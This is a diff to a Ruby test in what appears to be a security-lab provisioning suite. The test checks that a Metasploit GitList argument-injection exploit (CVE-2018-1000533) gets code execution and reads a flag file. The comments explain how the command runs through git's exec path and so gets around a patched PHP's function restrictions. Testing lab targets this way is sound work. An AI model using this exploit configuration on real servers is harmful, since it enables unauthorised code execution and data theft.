@@ -36,10 +36,15 @@ class Gitlist040Test < PostProvisionTest
                          'cat /opt/php-7.4-patched/PHP2SHELL_FIX_COMMIT', FIX_COMMIT)
     end
     # Tier 3: argument-injection RCE from the attacker VM (CVE-2018-1000533).
-    # cmd/unix/generic: no session needed — the injected command runs directly
-    # on the target as www-data. collect reads the leaked flag from /home/git/.
+    # php/unix/cmd/generic: the module is PHP-platform (cmd/unix/generic is
+    # incompatible). The argument injection runs the CMD via the PHP exec call
+    # to git, outside the php2shell-patched function restrictions, so the
+    # patched PHP 7.4 still allows this execution path. collect reads the
+    # leaked flag from /home/git/ (owner www-data, mode 0750 — readable by
+    # the exploit process running as www-data).
     test_msf_exploit('exploit/multi/http/gitlist_arg_injection',
                      rport: self.port,
+                     payload: 'php/unix/cmd/generic',
                      collect: 'cat /home/git/*',
                      options: { 'TARGETURI' => '/' },
                      tier: 3)
